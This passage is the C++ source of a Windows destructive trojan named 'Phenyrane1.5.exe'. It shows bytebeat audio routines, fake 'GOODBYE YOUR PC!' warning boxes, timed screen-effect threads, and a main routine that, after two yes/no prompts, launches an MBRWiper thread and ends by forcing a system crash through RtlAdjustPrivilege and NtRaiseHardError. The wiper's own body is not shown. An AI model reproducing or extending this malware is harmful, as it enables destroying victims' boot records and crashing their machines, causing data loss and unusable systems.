    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t % 512) * (t % 300)) >> 7);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 23) ^ (t >> 4) ^ (t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t & 0xFFFF) * (t & 0xFFF)) >> 9);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ (t >> 9) ^ (t >> 12)) & 234);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5) & (t * 8) ^ (t * 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t % 2048) * (t % 2048)) >> 10);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 0) ^ (t >> 4) ^ (t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI fakeerror(LPVOID lpParam) {
    MessageBoxA(NULL, "GOODBYE YOUR PC!", "Phenyrane1.5.eXe - sYStEm wARniNG", MB_ICONWARNING);
    return 0;
}

int main() {
    if (MessageBoxW(NULL, L"This is a destructive malware, execute it?", L"Phenyrane1.5.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure? It will harm you PC it NOT for epilepsy! ", 
                    L"Phenyrane1.5.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, d, 0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, fakeerror, 0, 0, 0);
            Sleep(1000);
            HANDLE thread1 = CreateThread(0, 0, blur1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, shader1, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, hexagon, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, trianglez, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, blur2, 0, 0, 0);
            sound6();
            Sleep(30000);
            InvalidateRect(0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, invcc, 0, 0, 0);
            sound7();
            Sleep(30000);
            InvalidateRect(0, 0, 0);
            HANDLE thread8 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            HANDLE thread9 = CreateThread(0, 0, blur3, 0, 0, 0);
            HANDLE thread9dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
            HANDLE thread10 = CreateThread(0, 0, shader6, 0, 0, 0);
            sound10();
            Sleep(30000);
            
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
    Sleep(-1);
}